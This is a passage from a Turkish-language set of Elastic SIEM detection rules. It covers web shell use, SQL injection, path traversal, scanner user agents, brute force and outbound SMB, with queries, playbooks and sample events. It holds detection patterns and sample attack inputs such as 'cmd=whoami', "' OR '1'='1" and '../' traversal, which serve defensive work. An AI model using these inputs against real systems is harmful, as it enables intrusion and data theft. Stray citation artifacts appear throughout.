  false_positive_notes: "İçeriden dışarıya SMB/RDP normalde bloklanmalıdır. Bazı özel durumlarda BT ekipleri bilinçli olarak bir dış sunucuya bu portlardan bağlanıyor olabilir (örneğin bulut sunucusunda RDP yönetimi), ancak bu nadir ve prosedüre bağlıdır. Genel olarak, bu tür trafik görülüyorsa ciddiye alınmalıdır."
  response_playbook:
    - "Bağlantı kuran iç makineyi tespit edip derhal inceleyin; zararlı yazılım bulaşıp dışarıya yayılmaya çalışıyor olabilir."
    - "Güvenlik duvarı kural setinizi gözden geçirin; bu tür trafiğe nasıl izin verilmiş olduğunu (açık kural, kural boşluğu vs.) saptayıp gerekli düzenlemeyi yapın."
    - "Dış hedef IP'nin kim olduğunu analiz edin (Whois veya Threat Intelligence kullanarak); bilinen bir zararlı kontrol sunucusu veya anormal bir destinasyon ise, IOC olarak paylaşın."
    - "Aynı iç segmentte başka makinelerin benzer portlardan dışarı çıkmaya çalışıp çalışmadığını loglarda araştırın; bir solucan veya ağ içi yayılma söz konusu olabilir."
  references:
    - "MITRE ATT&CK T1571: Saldırganlar bazen tespit edilmemek için protokolü standart olmayan porttan gönderirler (örn. HTTP over 8080 vb.) - outbound RDP/SMB da alışılmadık port kullanımı kapsamında değerlendirilebilir:contentReference[oaicite:38]{index=38}"
    - "Normal şartlarda iç ağdan dışarıya SMB/RDP trafiği olmamalıdır; bu, WannaCry gibi worm salgınlarında görülen bir davranıştır ve hızlıca engellenmelidir:contentReference[oaicite:39]{index=39} (Bu referans normalden farklı port kullanımıyla ilgilidir, konsept olarak ilgili)."
  example_event: |
    {
      "@timestamp": "2025-10-03T15:40:00.000Z",
      "source.ip": "192.168.20.10",
      "destination.ip": "203.0.113.100",
      "destination.port": 445,
      "network.direction": "outbound",
      "action": "allow",
      "user.id": "S-1-5-21-...",
      "host.name": "Client-02"
    }
  short_explanation: "İç ağdaki 192.168.20.10 makinesi, internet üzerindeki 203.0.113.100 IP'sine 445/TCP portundan (SMB) bağlantı kurdu. Alarm alındığında, ilgili istemciyi hemen ağdan ayırarak tarayın; bu davranış, bir zararlının dışarıdaki bir sunucuya yayılma veya bağlantı kurma girişimi olabilir."

- title: "Olası veri sızdırma: Büyük boyutlu HTTP POST isteği"
  id: "WEB-001"
  description: "Bir istemci tarafından web sunucusuna alışılmadık derecede büyük boyutlu bir POST isteği gönderildi. Normal istek boyutlarını aşan (ör. >1 MB) POST verisi, saldırganların çok miktarda veriyi sunucuya yüklemeye (veya sunucu üzerinden dışarı aktarmaya) çalıştığını gösterebilir. Bu durum, veri sızdırma veya web uygulaması üzerinden veri transferi belirtisi olabilir."
  severity: "medium (Büyük hacimli web isteği olası veri sızıntısı göstergesi olduğundan dikkatle incelenmelidir.)"
  tags: ["mitre:T1048", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1048: Exfiltration Over Alternative Protocol"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    http.request.method: "POST" and http.request.body.bytes > 1000000
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "term": { "http.request.method": "POST" } },
          { "range": { "http.request.body.bytes": { "gt": 1000000 } } }
        ]
      }
    }
  threshold_or_rate: "N/A (Tek bir büyük istek alarm tetikler.)"
  false_positive_notes: "Büyük POST istekleri, meşru dosya yüklemelerinde görülebilir (ör. kullanıcılar siteye büyük dosyalar yüklüyor olabilir). Ancak uygulamanız normalde böyle bir kullanım içermiyorsa, bu istekler şüphelidir. Yanlış pozitifleri azaltmak için bilinen yükleme endpoint'lerini muaf tutmayı düşünebilirsiniz."
  response_playbook:
    - "İsteğin geldiği IP ve ilgili kullanıcı hesabını (varsa oturum kimliği) belirleyin; bu kullanıcı beklenmedik boyutta veri gönderiyorsa onun hesabını ve niyetini sorgulayın."
    - "Web sunucusunda ilgili isteğin hedef URL'sini inceleyin; bu URL bir yükleme endpoint'i mi, yoksa bu büyüklükte veri almaması gereken bir yer mi (örn. login formuna devasa veri gönderilmez, bu tip bir anomali olabilir)."
    - "Sunucu tarafında, bu isteğin sonucunda bir hata oluşmuş mu yoksa başarılı mı bakın (örn. 200 OK aldı mı, yoksa 500 hata üretti mi). Büyük istekler bazen DoS tetiklemek amacıyla da gönderilebilir."
    - "Eğer veri sızdırma şüphesi kuvvetliyse, ilgili IP'yi geçici olarak engelleyin ve uygulama loglarında o oturuma ait aktiviteleri (hangi verileri çekmiş olabilir) geriye dönük analiz edin."
  references:
    - "Elastic Hunting: 5MB üzeri büyük web yüklemeleri potansiyel veri sızdırma göstergesi olarak bayraklanabilir:contentReference[oaicite:40]{index=40}"
    - "MITRE ATT&CK T1048: Saldırganlar, ana C2 kanalı dışında HTTP gibi alternatif protokoller üzerinden veri kaçırabilirler (büyük boyutlu istekler bu tekniğin belirtisi olabilir):contentReference[oaicite:41]{index=41}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:45:00.000Z",
      "source.ip": "198.51.100.25",
      "http.request.method": "POST",
      "url.path": "/upload.php",
      "http.request.body.bytes": 5242880,
      "http.response.status_code": 200,
      "user_agent.original": "Mozilla/5.0",
      "host.name": "WebServer-01"
    }
  short_explanation: "Bir istemci /upload.php adresine ~5MB boyutunda POST verisi gönderdi. Bu alarm alındığında, isteğin meşru bir dosya yüklemesi mi yoksa anormal bir veri transferi mi olduğunu belirlemek için sunucu loglarını ve kullanıcıyı inceleyin."

- title: "Web kabuğu belirtisi: Şüpheli komut parametresi (cmd=) kullanımı"
  id: "WEB-002"
  description: "Bir web isteğinde, URL içinde veya parametrelerinde `cmd=`, `exec=` gibi komut satırı parametrelerine rastlandı. Bu tip parametreler, sunucu tarafında komut çalıştıran basit bir web kabuğunun kullanıldığına işaret edebilir. Örneğin `GET /shell.jsp?cmd=whoami` şeklinde bir istek, sunucuda yüklü bir web shell aracılığıyla komut yürütme girişimidir."
  severity: "high (Web kabuğu kullanımına dair güçlü bir gösterge olduğu için kritik önemdedir.)"
  tags: ["mitre:T1505.003", "kill_chain:ActionsOnObjectives"]
  mitre_attack:
    - "T1505.003: Web Shell"
  kill_chain_phase: "ActionsOnObjectives"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    url.query: (*cmd=* or *exec=* or *execute=*)
  detection_query_dsl: >-
    {
      "bool": {
        "should": [
          { "wildcard": { "url.query": "*cmd=*" } },
          { "wildcard": { "url.query": "*exec=*" } },
          { "wildcard": { "url.query": "*execute=*" } }
        ],
        "minimum_should_match": 1
      }
    }
  threshold_or_rate: "N/A (Tek tespit alarm için yeterli.)"
  false_positive_notes: "Bazı meşru uygulamalar parametre adı olarak 'cmd' veya 'exec' kullanabilir (örneğin, 'cmd' gerçek bir komut yerine bir veri parametresi olabilir). Ancak bu oldukça nadirdir. Genellikle tarayıcı tarafından tetiklenen bu tip parametreler zararlı tarama araçlarından gelir (nikto, w3af vb. denemeleri). Yanlış pozitif ihtimali düşüktür ama uygulamanızı tanıyorsanız parametre kullanımını doğrulayın."
  response_playbook:
    - "İsteğin geldiği IP adresini not edin; bu adres muhtemelen bir tarayıcı değil, bir araç (tarama yapan) olabilir. Geçmiş loglarda aynı IP'nin başka kötü niyetli istekleri (farklı URL'lere 'cmd=' parametreli istekler gibi) olup olmadığına bakın."
    - "Hedef URL'yi (ör. /shell.jsp) sunucu üzerinde araştırın; böyle bir dosya mevcut mu, saldırgan yüklemiş olabilir. Sunucu dosya sisteminde 'shell', 'cmd' gibi adları aratın."
    - "Uygulama geliştiricilerine danışarak, eğer 'cmd' gibi parametre adları kullanan meşru fonksiyonlar yoksa, web uygulama güvenlik duvarınızda (WAF) bu tür pattern'leri engelleyecek kural uygulayın."
    - "Sunucu üzerinde bu isteği yapan IP'nin hemen ardından bir komut çıktısı almaya çalışıp çalışmadığını loglardan görün (ör. hemen sonrasında uzun bir cevap döndü mü). Web shell şüphesi kuvvetliyse, ilgili sunucuyu karantinaya alıp adli analiz yapın."
  references:
    - "MITRE ATT&CK T1505.003: Web Shell'ler, saldırganın web sunucusunda komut çalıştırmasına olanak tanır; bir web shell genelde 'cmd' parametresiyle komutları iletir:contentReference[oaicite:42]{index=42}"
    - "Elastic Kuralı: Web sunucusu prosesinin altına script/CLI çalıştırılması, web shell kullanımını gösterir (Benzer parametreler de bu aktivitenin HTTP tarafındaki belirtisidir):contentReference[oaicite:43]{index=43}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:50:00.000Z",
      "source.ip": "203.0.113.50",
      "http.request.method": "GET",
      "url.path": "/upload/shell.jsp",
      "url.query": "cmd=whoami",
      "http.response.status_code": 200,
      "user_agent.original": "Mozilla/5.0",
      "host.name": "WebServer-02"
    }
  short_explanation: "Bir web isteğinde 'cmd=whoami' parametresi tespit edildi. Bu genellikle sunucuya yerleştirilmiş bir web kabuğu aracılığıyla komut çalıştırma girişimidir. Alarm alındığında, ilgili sunucuda böyle bir kabuk dosyası olup olmadığını ve saldırganın neler yapabildiğini ivedilikle araştırın."

- title: "Şüpheli web shell dosya isteği (shell.aspx, etc)"
  id: "WEB-003"
  description: "Web sunucusunda 'shell.jsp', 'backdoor.aspx', 'cmd.php' gibi adlarla bilinen web shell dosyalarına erişim girişimi tespit edildi. Saldırganlar, varsa yüklenmiş web shell dosyalarını çağırarak sunucuda komut çalıştırmaya çalışır. Bu istekler, ya saldırganın önceden yüklediği bir kabuğu aktive ettiğini ya da körlemesine bilinen kabuk isimlerini yokladığını gösterir."
  severity: "high (Web shell erişim denemesi sunucunun kompromize olduğunu veya edilmeye çalışıldığını gösterdiğinden kritik önemdedir.)"
  tags: ["mitre:T1505.003", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1505.003: Web Shell"
  kill_chain_phase: "Exploitation"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    url.path: ("*shell.jsp" or "*shell.aspx" or "*cmd.jsp" or "*backdoor.php" or "*webshell.php")
  detection_query_dsl: >-
    {
      "bool": {
        "should": [
          { "wildcard": { "url.path": "*shell.jsp" } },
          { "wildcard": { "url.path": "*shell.aspx" } },
          { "wildcard": { "url.path": "*cmd.jsp" } },
          { "wildcard": { "url.path": "*backdoor.php" } },
          { "wildcard": { "url.path": "*webshell.php" } }
        ],
        "minimum_should_match": 1
      }
    }
  threshold_or_rate: "N/A (Her tespit önemlidir.)"
  false_positive_notes: "Normal kullanıcı trafiğinde bu isimlerde dosyalara istek olmaz. Web yönetim arabirimleriniz bu adları kullanmıyorsa (ki genelde kullanmaz), bu istekler kötücül tarama veya shell kullanımıdır. Yanlış pozitif ihtimali yok denecek kadar azdır."
  response_playbook:
    - "Hedeflenen dosya adını sunucuda arayın; eğer mevcutsa, bir saldırgan tarafından yüklenmiş olabilir. Bu dosyayı hemen tespit edip inceleyin (içeriğini açıp ne yaptığını görün) ve sunucudan kaldırın."
    - "İsteğin kaynağına bakın; tek bir IP belli aralıklarla farklı shell adları deniyorsa otomatik tarama yapıyor demektir, o IP’yi engelleyin ve taktiklerini not edin."
    - "Sunucunun dosya yükleme loglarını gözden geçirin; bu kabuk dosyası ne zaman ve hangi yolla yüklenmiş, bulabilirseniz o zafiyeti (ör. vuln. upload formu) kapatın."
    - "Sunucuda ilave arka kapılar olup olmadığını tarayın (ör. bilindik başka shell dosya isimleri, beklenmeyen .aspx/.php dosyaları). Gerekiyorsa sunucuyu yeniden kurma planı yapın çünkü tamamen kompromize edilmiş olabilir."
  references:
    - "MITRE ATT&CK T1505.003: Web shell, sunucuda arka kapı erişimi sağlar; örneğin reGeorg, China Chopper gibi web shell'ler yaygındır:contentReference[oaicite:44]{index=44}"
    - "CISA Alert AA20-259A: Saldırganlar OWA, Exchange vb. sunuculara web shell (ASPXSpy vb.) yükleyerek kalıcılık sağlarlar:contentReference[oaicite:45]{index=45}:contentReference[oaicite:46]{index=46}"
  example_event: |
    {
      "@timestamp": "2025-10-03T15:55:00.000Z",
      "source.ip": "202.0.2.123",
      "http.request.method": "GET",
      "url.path": "/inc/shell.aspx",
      "http.response.status_code": 404,
      "user_agent.original": "curl/7.68.0",
      "host.name": "WebServer-02"
    }
  short_explanation: "Bir istemci, sunucuda 'shell.aspx' adında bir dosyaya istek yaptı fakat 404 döndü. Bu, saldırganın sunucuda web shell olup olmadığını yokladığını gösterir. Alarm alındığında, sunucu dosya sisteminde benzer adlarda dosyalar arayın ve web uygulamanızın dosya yükleme açıkları olup olmadığını değerlendirin."

- title: "Şüpheli tarayıcı aracı kullanıcı-ajenti (muhtemel tarama aracı)"
  id: "WEB-004"
  description: "Web sunucusu loglarında, bilinen güvenlik tarayıcılarının veya otomatik araçların kullanıcı ajanı (User-Agent) tespit edildi. Örneğin \"sqlmap\", \"Nikto\", \"Acunetix\" gibi stringler user-agent bilgisinde görüldü. Bu, bir saldırganın otomatik araçlarla sitenizi taradığını veya zafiyet aradığını gösterir."
  severity: "low (Tarama faaliyetinin erken göstergesi olup düşük seviyede ancak sürekli izlenmesi gereken bir uyarıdır.)"
  tags: ["mitre:T1595.002", "kill_chain:Reconnaissance"]
  mitre_attack:
    - "T1595.002: Active Scanning: Vulnerability Scanning"
  kill_chain_phase: "Reconnaissance"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    user_agent.original: ("sqlmap" or "Nikto" or "Acunetix" or "DirBuster" or "sqlmap")
  detection_query_dsl: >-
    {
      "bool": {
        "should": [
          { "wildcard": { "user_agent.original": "*sqlmap*" } },
          { "wildcard": { "user_agent.original": "*Nikto*" } },
          { "wildcard": { "user_agent.original": "*Acunetix*" } },
          { "wildcard": { "user_agent.original": "*DirBuster*" } }
        ],
        "minimum_should_match": 1
      }
    }
  threshold_or_rate: "N/A (Her tespit raporlanır.)"
  false_positive_notes: "Bu user-agent stringleri normal tarayıcılardan gelmez. Gelişmiş tarayıcı eklentileri veya hata tarayıcıları (bug bounty araçları) bunları kullanabilir ancak kurumsal ortamda son kullanıcı trafiğinde bu yoktur. Dolayısıyla FP olası değildir. Eğer pentest ekibiniz böyle araçlar kullanıyorsa, onların IP'lerini biliyor olmalısınız."
  response_playbook:
    - "İlgili IP adresini izleyin; aynı IP kısa sürede birden çok sayfaya istek yapıyor mu analiz edin. Eğer evet ise, bu taramayı yapan aktör hakkında bilgi toplayın (WHOIS, IP geçmişi)."
    - "Web sunucusunu ve uygulamaları olası zafiyetlere karşı tarayın; saldırgan sizden önce açık bulmaya çalışıyor olabilir. Kendi taramalarınızı yaparak savunmada proaktif olun."
    - "Varsa WAF (Web Application Firewall) kuralı ekleyerek bilinen zararlı user-agent stringlerini engelleyebilirsiniz; ancak bu tam çözüm değildir, saldırgan user-agent'ı değiştirebilir."
    - "Bu IP'yi geçici olarak engellemeyi değerlendirin. Dış kaynaktan gelen yoğun tarama tespit edildiyse, hukuksal veya ISP'ye bildirim düşünebilirsiniz (özellikle sürekli devam ederse)."
  references:
    - "MITRE ATT&CK T1595.002: Saldırganlar zafiyet taraması yaparak hedef uygulamanın açıklarını arar (Nikto, sqlmap gibi araçlar kullanılması):contentReference[oaicite:47]{index=47}"
    - "OWASP Top 10 - OTG-INFO-001: Web uygulaması keşif aşamasında araçların izleri (User-Agent) loglarda görülebilir, bu sayede tarama tespit edilebilir (kaynak: OWASP Testing Guide)."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:00:00.000Z",
      "source.ip": "198.51.100.77",
      "http.request.method": "GET",
      "url.path": "/",
      "user_agent.original": "Mozilla/5.0 (Nikto/2.1.6) ",
      "http.response.status_code": 200,
      "host.name": "PublicWeb-01"
    }
  short_explanation: "Bir istemci 'Nikto' tarayıcı aracının kullanıcı-ajenti ile siteye istek yaptı. Alarm sonrasında, bu IP'nin tarama yapıp yapmadığını (farklı URL'lere istekler) gözlemleyin; sunucunuzu olası zafiyetlere karşı kontrol edin ve gerekirse IP'yi engelleyin."

- title: "Olası SQL Enjeksiyon girişimi (şüpheli parametre deseni)"
  id: "WEB-005"
  description: "Bir web isteğinde, `' OR '1'='1` veya `UNION SELECT` gibi SQL enjeksiyonuna özgü kalıplar tespit edildi. Saldırganlar URL sorgu parametrelerine veya form girdilerine bu tür dize kalıpları enjekte ederek veri tabanına istenmeyen komutlar göndermeye çalışıyor olabilir. Bu alarm, web uygulamanıza yönelik bir SQL Injection saldırı denemesini gösterir."
  severity: "high (SQL enjeksiyon girişimiyle veritabanı güvenliği tehdit edildiğinden kritik önemdedir.)"
  tags: ["mitre:T1190", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1190: Exploit Public-Facing Application"
  kill_chain_phase: "Exploitation"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    url.query: ("%' or 1=1" or "*UNION*SELECT*" or "*--%20")
  detection_query_dsl: >-
    {
      "bool": {
        "should": [
          { "wildcard": { "url.query": "*' or '1'='1*" } },
          { "wildcard": { "url.query": "*UNION*SELECT*" } },
          { "wildcard": { "url.query": "*--%20*" } }
        ],
        "minimum_should_match": 1
      }
    }
  threshold_or_rate: "N/A (Tek bir şüpheli istek bile alarmdır.)"
  false_positive_notes: "Bazı durumlarda meraklı kullanıcılar veya hatalı uygulamalar bu tür stringler oluşturabilir ama çok nadirdir. Genellikle bu pattern'ler doğrudan saldırı göstergesidir. Uygulamanızın normal parametre değerlerinin bu kalıpları içermediğinden emin olduktan sonra FP olmadığını varsayabilirsiniz."
  response_playbook:
    - "İstek detaylarını (kaynak IP, hedef URL, parametreler) kaydedin. Aynı IP'den benzer saldırı denemeleri devam ediyorsa IP'yi engellemeyi düşünün."
    - "Web uygulamanızın bu parametreye verdiği cevabı kontrol edin (loglardan veya uygulama ekibinden). Saldırı başarılı olamadıysa  hata loglarına yansımış olabilir (ör. veritabanı hata mesajı)."
    - "Uygulama geliştiricilerine bu spesifik parametre ve sayfa için kod gözden geçirmesi yaptırın; mümkünse zafiyeti doğrulayın ve yamalayın (hazırda WAF yoksa hızlı patch önemlidir)."
    - "Eğer saldırı başarılı olmuş olma ihtimali varsa (ör. hassas veri sızdıysa), olay müdahale sürecini başlatın: veritabanı sorgu loglarını inceleyin, etkilenen verileri belirleyin ve ilgili paydaşlara haber verin."
  references:
    - "OWASP Cheat Sheet: SQL Injection payload örnekleri (örn. ' OR '1'='1, UNION SELECT) sık kullanılır; loglarda bu kalıpları aramak tespit yöntemidir."
    - "MITRE ATT&CK T1190: Saldırganlar web uygulaması zafiyetlerinden (SQLi, RFI vs.) yararlanarak sisteme sızmaya çalışır; bu atakların tipik işaretleri isteklerdeki anormal kalıplardır."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:05:00.000Z",
      "source.ip": "203.0.113.90",
      "http.request.method": "GET",
      "url.path": "/search",
      "url.query": "q=1'+OR+1=1--",
      "http.response.status_code": 500,
      "host.name": "PublicWeb-01"
    }
  short_explanation: "Bir arama isteğinde `1' OR 1=1--` gibi bir dize saptandı ve sunucu 500 hatası döndü. Bu, aktif bir SQL enjeksiyon denemesine işaret eder. Alarm alındığında, ilgili parametreyi kullanan sayfayı acilen test edin, geliştiricilere durumu bildirin ve gerekirse WAF üzerinden bu sorguyu engelleyin."

- title: "Olası Path Traversal (dizin geçişi) saldırı denemesi"
  id: "WEB-006"
  description: "Web isteğinde `../` (dizün geri çık) veya benzeri yol geçiş pattern'leri tespit edildi. Saldırganlar, dosya sistemine izinsiz erişmek için URL'lerde `../../` gibi ifadeler kullanarak uygulama dizinlerinin dışına çıkmaya çalışıyor olabilir. Bu alarm, web uygulamanıza yönelik bir Path Traversal (dizin geçişi) saldırı girişimini gösterir."
  severity: "medium (Dosya sistemi sızdırma girişimi tespit edildiğinden önemli bir güvenlik olayıdır.)"
  tags: ["mitre:T1190", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1190: Exploit Public-Facing Application"
  kill_chain_phase: "Exploitation"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    url.path: "*../*"
  detection_query_dsl: >-
    {
      "wildcard": { "url.path": "*../*" }
    }
  threshold_or_rate: "N/A (Tek bir deneme alarm olarak ele alınır.)"
  false_positive_notes: "Kullanıcı isteklerinde '../' dizgesi genellikle bulunmaz, bu bariz bir saldırı pattern'idir. Yalnızca yanlış yapılandırılmış web sunucuları, URL'leri decode ederken normal sayfa isimlerinde '../' görebilir, ama pratikte FP olmamalı. Yine de logların kod çözme durumuna dikkat edin (encoded '%2e%2e%2f' gibi gelebilir)."
  response_playbook:
    - "İsteğin tam URL yolunu inceleyin; saldırgan hangi dosya veya dizine erişmeye çalışmış (ör. '../../etc/passwd' gibi)? Bu size amacını gösterir."
    - "Web sunucusu konfigürasyonunuzu gözden geçirin; dizin geçişine karşı izole (jail/chroot) var mı, ya da bu pattern'i engelleyen bir kural mevcut mu, emin olun."
    - "Uygulama geliştiricileriyle iletişime geçip, dinamik dosya okumaları yapan bileşenlerde (eğer varsa) path traversal zafiyeti olup olmadığını kontrol ettirin."
    - "Kök dizin dışına erişim girişimleri WAF tarafından engellenebilir; WAF kullanıyorsanız bu pattern için kuralın etkin olduğundan emin olun. Yoksa mod_security gibi bir çözümde OWASP CRS kural setini düşünebilirsiniz."
  references:
    - "OWASP Top 10 A5:2017 - Directory Traversal saldırıları, '../' dizgelerini içerir; log analizinde bu tip girişimler tespit edilmelidir."
    - "MITRE ATT&CK T1190: Saldırganlar hatalı girdi doğrulamalarından faydalanarak (örn. path traversal) sunucu üzerindeki dosyalara erişebilir; '../' en bilinen göstergedir."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:10:00.000Z",
      "source.ip": "198.51.100.33",
      "http.request.method": "GET",
      "url.path": "/../../windows/win.ini",
      "http.response.status_code": 403,
      "host.name": "PublicWeb-01"
    }
  short_explanation: "Bir istek, '../windows/win.ini' gibi bir üst dizine çıkma girişimi içeriyordu ve sunucu 403 döndürdü. Bu alarmı takiben, uygulamanızın dizin geçişine karşı korumalarını doğrulayın; saldırgan hedefine ulaşamadıysa da denediği açığın varlığını değerlendirin."

- title: "Aynı IP'den çok sayıda 4xx/5xx hata (tarama/brute force şüphesi)"
  id: "WEB-007"
  description: "Belirli bir kaynak IP adresi, kısa süre içerisinde web sunucusundan birden fazla 4xx (istemci hatası) veya 5xx (sunucu hatası) yanıtı aldı. Örneğin ardışık bir şekilde bir IP'den onlarca 404 veya 401 hatası gözlemlendi. Bu durum, bir tarayıcının dizin/dosya taraması yaptığını veya bir brute force denemesi (çok sayıda hatalı giriş) gerçekleştirdiğini gösterebilir."
  severity: "low (Tek başına sistem bütünlüğünü bozmaz ama keşif aşamasını gösterdiği için izlenmesi gerekir.)"
  tags: ["mitre:T1595.003", "kill_chain:Reconnaissance"]
  mitre_attack:
    - "T1595.003: Active Scanning: Wordlist Scanning"
  kill_chain_phase: "Reconnaissance"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    http.response.status_code: (401 or 403 or 404 or 500)
  detection_query_dsl: >-
    {
      "terms": { "http.response.status_code": [401, 403, 404, 500] }
    }
  threshold_or_rate: "Kaynak IP başına 10 hata yanıtı (1 dk içinde)"
  false_positive_notes: "Bir kullanıcının yanlış URL'lere kazara basması veya bozuk bir arama motoru botu bir miktar 404 üretebilir, ancak çok sayıda hata genellikle normal değildir. İçerik tarama motorları (search engine crawler) bile bu kadar çok hataya sebep olmaz kısa sürede. Sürekli hata alan bir istemci muhtemelen otomatik saldırı aracıdır."
  response_playbook:
    - "Hata kodlarının dağılımını kontrol edin; örneğin hep 404 mü almış yoksa 401 de var mı? 401'ler varsa brute force login denemesi olabilir, 404'ler dizin taraması olabilir."
    - "İlgili IP'yi geçici olarak engellemeyi değerlendirin eğer yoğun tarama neticesi olduğu açıksa; ama önce IP'nin ait olduğu yeri (belki meşru bir tarayıcı botu mu) tespit edin."
    - "Sunucuya gelen isteklerin erişmeye çalıştığı yolları inceleyin (özellikle 404'ler için hangi dosyalar istenmiş); bu size saldırganın wordlist'ini ele verebilir (ör. /admin, /login, /config gibi)."
    - "Eğer hatalar 500 sunucu hataları ise, uygulamanız muhtemelen bir saldırı girdisiyle baş edememiş demektir; loglardan hatanın stack trace vs. yakalamaya çalışın, uygulama ekibine iletin."
  references:
    - "MITRE ATT&CK T1595.003: Saldırganlar wordlist kullanarak dosya/dizin araması yapabilir; bunun sonucu sunucudan çok sayıda 404 hatası dönebilir:contentReference[oaicite:48]{index=48}"
    - "OWASP Brute Force ve DirBuster gibi araçlar, loglarda art arda gelen hata kodlarıyla kendini belli eder. Bu göstergeler mavi takım tarafından tarama tespitinde kullanılır."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:15:00.000Z",
      "source.ip": "203.0.113.150",
      "http.request.method": "GET",
      "url.path": "/admin/login.php",
      "http.response.status_code": 401,
      "user_agent.original": "Mozilla/5.0",
      "host.name": "PublicWeb-01"
    }
  short_explanation: "203.0.113.150 IP'si, kısa sürede birden fazla istek sonucu 4xx/5xx hataları aldı (ör. /admin/login.php 401 hatası gibi). Alarm alındığında, bu IP'nin sitenizde ne yapmaya çalıştığını (dosya/dizin mi arıyor, login mi deniyor) analiz edin; gerekirse IP'yi bloklayın ve ilgili zafiyetleri araştırın."

- title: "Olağandışı HTTP yöntem kullanımı (OPTIONS/TRACE/DEBUG isteği)"
  id: "WEB-008"
  description: "Web loglarında, normalde nadir kullanılan HTTP metodları (OPTIONS, TRACE, TRACK, DEBUG, PROPFIND vb.) kullanılarak istek yapıldığı saptandı. Bu yöntemler, genellikle tarayıcılar tarafından rutin olarak kullanılmaz (OPTIONS hariç bazı CORS durumları). Saldırganlar sunucu hakkında bilgi toplamak veya zafiyet test etmek için bu HTTP metodlarını göndermiş olabilir."
  severity: "low (Alışılmadık HTTP metodu tespit edildiği için potansiyel keşif aşaması göstergesi, ancak kendi başına bir exploit değil.)"
  tags: ["mitre:T1595", "kill_chain:Reconnaissance"]
  mitre_attack:
    - "T1595: Active Scanning"
  kill_chain_phase: "Reconnaissance"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    http.request.method: ("OPTIONS" or "TRACE" or "TRACK" or "DEBUG" or "PROPFIND")
  detection_query_dsl: >-
    {
      "terms": { "http.request.method": ["OPTIONS", "TRACE", "TRACK", "DEBUG", "PROPFIND"] }
    }
  threshold_or_rate: "N/A (Tekil istek alarm olarak raporlanır.)"
  false_positive_notes: "OPTIONS isteği, modern tarayıcıların CORS preflight'larında meşru olarak görülür, bu bir FP kaynağı olabilir. TRACE, TRACK, DEBUG gibi metodlar ise normalde FP değildir. Bu alarmda, OPTIONS metodunu eğer uygulamanız CORS kullanıyorsa ayrı değerlendirin; diğer metodlar direk şüpheli sayılabilir."
  response_playbook:
    - "Alarm özellikle TRACE veya DEBUG gibi bir metod için geldiyse, sunucunuzun bu metodlara yanıt verip vermediğini kontrol edin; bu metodlar XSS veya bilgi sızmasına yol açabilir, sunucu ayarlarında devre dışı bırakın."
    - "OPTIONS metodu için alarmları, CORS preflight'tan mı kaynaklı ayırt edin. Eğer beklenen bir cross-domain çağrıysa, FP olarak işaretlenebilir; değilse tarayıcı harici bir araç olabilir."
    - "İsteği yapan IP adresini ve User-Agent bilgisini analiz edin; bilinen bir güvenlik tarama aracının ayak izi olabilir (bazı scanner'lar özel user-agent ve metodlar kullanır)."
    - "Web sunucu yapılandırmanızı gözden geçirerek, gereksiz HTTP metodlarını (TRACE, TRACK gibi) devre dışı bırakın. Güvenlik en iyi pratiği olarak sadece ihtiyaç duyulan metodlar (GET, POST, HEAD genelde) açık kalmalıdır."
  references:
    - "RFC 2616 (HTTP/1.1) belirli metodların kullanımını tanımlar; TRACE gibi metodların etkin olması, 'Cross Site Tracing' adı verilen saldırıya imkan verebilir, genellikle kapatılması önerilir."
    - "MITRE ATT&CK T1595: Saldırganlar hedef sistemin HTTP metod desteklerini öğrenmek ve potansiyel açık kapıları aramak için bu tip istekler gönderir; bu faaliyet aktif keşif kapsamındadır."
  example_event: |
    {
      "@timestamp": "2025-10-03T16:20:00.000Z",
      "source.ip": "192.0.2.60",
      "http.request.method": "TRACE",
      "url.path": "/",
      "http.response.status_code": 200,
      "user_agent.original": "Mozilla/4.0",
      "host.name": "PublicWeb-01"
    }
  short_explanation: "Sunucuya bir TRACE isteği yapıldı ve 200 döndü (sunucu TRACE metodunu destekliyor). Alarm sonrasında, TRACE metodunu sunucuda devre dışı bırakın ve isteği yapan IP'nin tarama yapıp yapmadığını diğer loglarla birlikte analiz edin."

- title: "Web uygulaması brute-force girişimi (birden fazla hatalı giriş denemesi)"
  id: "WEB-009"
  description: "Web uygulamasındaki bir oturum açma sayfasına ait, aynı IP adresi (veya aynı kullanıcı hesabı) üzerinden çok sayıda ardışık başarısız giriş denemesi tespit edildi. Örneğin 5 dakika içinde aynı IP'den 10 kere HTTP 401 Unauthorized cevabı alındı. Bu durum, parola tahmin (brute force) saldırısı olabileceğini gösterir."
  severity: "medium (Web üzerinden kimlik bilgisi tahmini girişimi tespit edildiği için önemlidir.)"
  tags: ["mitre:T1110.001", "kill_chain:Exploitation"]
  mitre_attack:
    - "T1110.001: Brute Force: Password Guessing"
  kill_chain_phase: "Exploitation"
  indices:
    - "filebeat-*"
  detection_query_kql: >-
    url.path: "*login*" and http.response.status_code: 401
  detection_query_dsl: >-
    {
      "bool": {
        "must": [
          { "wildcard": { "url.path": "*login*" } },
          { "term": { "http.response.status_code": 401 } }
        ]
      }
    }
  threshold_or_rate: "Kaynak IP (veya kullanıcı) başına 5 başarısız giriş denemesi (5 dk içinde)"
  false_positive_notes: "Gerçek kullanıcılar bazen parolalarını birkaç kez yanlış girebilir, ancak genellikle 2-3 denemeden sonra ya başarır ya vazgeçer. Onlarca başarısız deneme bir kullanıcıdan gelmez. Yine de, popüler bir site ise ve kullanıcılar parolasını unutmuşsa birkaç deneme daha görebilirsiniz, bu durumda eşik değerini ortamınıza göre ayarlayın."
  response_playbook:
